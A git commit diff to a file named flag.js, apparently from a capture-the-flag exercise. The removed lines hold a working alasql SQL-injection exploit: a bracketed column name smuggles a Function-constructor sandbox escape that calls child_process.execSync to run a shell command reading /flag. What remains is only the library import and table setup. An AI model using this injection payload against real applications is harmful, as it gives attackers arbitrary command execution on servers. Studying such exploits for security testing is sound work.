b37ee65b43bc539a1d20367524761171ef9e9faf
vr2 <hydw9898@gmail.com>
2024-11-14 10:11:15 +0900

    Update flag.js

--- flag.js
+++ flag.js
@@ -1,9 +1,4 @@
-const genPayload = command => `
-new Function(
-    'return this.process.mainModule.require'
-)()('child_process').execSync(${JSON.stringify(command)})
-`;
-
+const alasql = require('alasql');
 alasql("CREATE TABLE example1 (a INT)");
 alasql("INSERT INTO example1 VALUES (1337)");
-alasql("UPDATE example1 SET [0'+${genPayload(">&2 echo UPDATE pwned $(/flag)")}+']=42");
+
